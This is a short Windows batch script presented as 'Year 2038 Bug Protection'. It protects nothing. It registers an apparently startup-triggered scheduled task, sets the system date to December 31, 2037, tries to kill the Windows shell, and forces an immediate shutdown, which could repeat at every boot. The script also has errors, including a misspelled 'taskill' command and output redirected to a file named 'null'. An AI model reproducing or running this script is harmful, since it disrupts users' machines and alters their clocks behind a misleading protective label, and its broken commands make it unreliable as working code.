@echo off
color 4c
title Year 2038 Bug Protection
schtasks /Create /XML "C:\Program Files\Mant08\Y2038BUG\Tasks\Bug2038 Protection StartUp_After_Vista_Later.xml" /TN "Bug2038 Protection StartUp_After_Vista_Later"

TIMEOUT /t 120 >null
date 12-31-2037
time 11:00 AM
taskill /f /im explorer.exe
shutdown.exe /s /t 1
